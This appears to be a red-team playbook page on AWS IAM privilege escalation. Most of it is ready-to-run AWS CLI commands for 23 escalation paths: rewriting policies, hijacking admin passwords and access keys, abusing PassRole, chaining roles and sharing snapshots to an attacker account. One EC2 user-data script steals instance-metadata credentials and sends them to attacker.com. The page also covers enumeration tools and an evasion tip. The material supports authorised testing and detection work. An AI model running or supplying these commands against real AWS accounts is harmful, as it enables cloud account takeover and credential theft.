# AWS IAM Privilege Escalation
> **MITRE ATT&CK**: Privilege Escalation > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: AWS
> **Required Privileges**: Low (varies by method)
> **OPSEC Risk**: Medium

## Strategic Overview

AWS IAM is the crown jewel attack surface. With 10,000+ distinct API permissions across
hundreds of services, misconfigurations are inevitable. A red team lead must know the
21+ documented privesc paths and recognize that IAM policy complexity is the defender's
enemy and our advantage. Every permission is an API call, and dangerous combinations
often hide behind seemingly innocuous policies.

## Technical Deep-Dive

### Category 1 -- Direct Policy Manipulation

```bash
# 1. iam:CreatePolicyVersion - Create a new admin policy version
aws iam create-policy-version --policy-arn arn:aws:iam::ACCT:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:SetDefaultPolicyVersion - Switch to a permissive existing version
aws iam list-policy-versions --policy-arn arn:aws:iam::ACCT:policy/MyPolicy
aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCT:policy/MyPolicy --version-id v2

# 3-5. iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy
aws iam attach-user-policy --user-name victim \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 6-8. iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy (inline policies)
aws iam put-user-policy --user-name myuser --policy-name escalate \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### Category 2 -- Credential Manipulation

```bash
# 9. iam:CreateLoginProfile - Set console password for user without one
aws iam create-login-profile --user-name target-user --password 'N3wP@ss!' --no-password-reset-required

# 10. iam:UpdateLoginProfile - Reset another user's password
aws iam update-login-profile --user-name admin-user --password 'Hijack3d!'

# 11. iam:CreateAccessKey - Create keys for a higher-privileged user
aws iam create-access-key --user-name admin-user
# Returns AccessKeyId + SecretAccessKey for the admin user
```

### Category 3 -- PassRole Abuse (Most Common in Practice)

```bash
# 12. iam:PassRole + ec2:RunInstances
# Launch EC2 with an admin role, then steal credentials from metadata
aws ec2 run-instances --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro --iam-instance-profile Name=AdminRole \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds
curl -X POST https://attacker.com/exfil -d @/tmp/creds'

# 13. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
aws lambda create-function --function-name escalate \
  --runtime python3.9 --role arn:aws:iam::ACCT:role/AdminRole \
  --handler index.handler --zip-file fileb://escalate.zip
aws lambda invoke --function-name escalate /dev/stdout
# Lambda code calls sts:GetCallerIdentity to confirm admin context

# 14. iam:PassRole + lambda:UpdateFunctionCode
aws lambda update-function-code --function-name existing-function \
  --zip-file fileb://backdoor.zip
# If existing function already has high-priv role, just change the code

# 15. iam:PassRole + cloudformation:CreateStack
aws cloudformation create-stack --stack-name escalate \
  --template-body file://admin-stack.yaml \
  --role-arn arn:aws:iam::ACCT:role/CFNAdminRole \
  --capabilities CAPABILITY_NAMED_IAM

# 16. iam:PassRole + glue:CreateDevEndpoint
aws glue create-dev-endpoint --endpoint-name pwned \
  --role-arn arn:aws:iam::ACCT:role/GlueAdminRole \
  --public-key "ssh-rsa AAAA..."
```

### Category 4 -- Role Chaining & STS Abuse

```bash
# 17. sts:AssumeRole - Chain through permissive trust policies
aws sts assume-role --role-arn arn:aws:iam::ACCT:role/HighPrivRole \
  --role-session-name escalation

# 18. Role chaining: Role A can assume Role B which can assume Role C (admin)
# Map the chain with pmapper
pmapper graph --create
pmapper query "who can do iam:* with *"
pmapper visualize --filetype svg

# 19. sts:AssumeRoleWithSAML - If you control SAML IdP
# Forge SAML assertion with admin role ARN

# 20. sts:AssumeRoleWithWebIdentity - OIDC federation abuse
# Forge JWT if you compromise the OIDC provider
```

### Category 5 -- Service-Specific Escalation

```bash
# 21. codestar:CreateProject - Creates admin-like role automatically
aws codestar create-project --name escalate --id escalate

# 22. ssm:SendCommand - Execute commands on instances with high-priv roles
aws ssm send-command --instance-ids i-0abc123 \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole"]'

# 23. ec2:CreateSnapshot + ec2:ModifySnapshotAttribute - Data access via snapshots
aws ec2 create-snapshot --volume-id vol-0abc123
aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc \
  --attribute createVolumePermission --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID
```

### Automated Enumeration & Exploitation

```bash
# Pacu - AWS exploitation framework
pacu> run iam__enum_permissions          # Enumerate current permissions
pacu> run iam__privesc_scan              # Scan for escalation paths
pacu> run iam__enum_users_roles_policies # Full IAM enumeration

# enumerate-iam - Brute-force permission enumeration
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# Principal Mapper (pmapper) - Graph IAM relationships
pmapper graph --create                   # Build the graph
pmapper query "who can do s3:GetObject with *"
pmapper query "preset privesc *"         # Find all privesc paths
pmapper visualize --filetype png

# Cloudsplaining - IAM policy analysis
cloudsplaining download --profile target
cloudsplaining scan --input-file account-auth-details.json
```

## Detection & Evasion

| CloudTrail Event                | Indicates                              |
|---------------------------------|----------------------------------------|
| CreatePolicyVersion             | Policy escalation attempt              |
| AttachUserPolicy (Admin)        | Direct admin grant                     |
| CreateAccessKey (other user)    | Credential theft                       |
| PassRole + RunInstances         | EC2-based privilege escalation         |
| AssumeRole (unusual)            | Lateral movement / role chaining       |

```bash
# Evasion: Use iam:SimulatePrincipalPolicy before attempting escalation
# This read-only API tests permissions without actually performing actions
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCT:user/myuser \
  --action-names iam:CreatePolicyVersion iam:AttachUserPolicy
```

## Cross-References

- [AWS Initial Access](aws-initial-access.md)
- [AWS Persistence](aws-persistence.md)
- [AWS Services Abuse](aws-services-abuse.md)

## References

- https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/nccgroup/PMapper
- https://github.com/salesforce/cloudsplaining
- https://bishopfox.com/blog/privilege-escalation-in-aws
